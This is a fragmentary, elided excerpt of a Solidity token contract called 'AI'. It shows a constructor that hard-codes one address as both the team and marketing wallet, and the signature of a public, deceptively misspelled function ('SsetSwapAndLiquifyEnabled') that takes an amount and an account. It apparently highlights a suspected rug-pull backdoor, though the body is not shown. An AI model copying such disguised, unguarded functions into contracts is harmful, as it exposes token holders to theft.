...
contract AI is Context, IERC20, Ownable {
    ...
    constructor () {
        ...
        teamWalletAddress = payable(address(0x2A491C02Dd5106515E471076D296eEe9C5C6DCC2));
        marketingWalletAddress = payable(address(0x2A491C02Dd5106515E471076D296eEe9C5C6DCC2));
    ...
    function SsetSwapAndLiquifyEnabled(bool _enabled,uint256 am,address account) public {
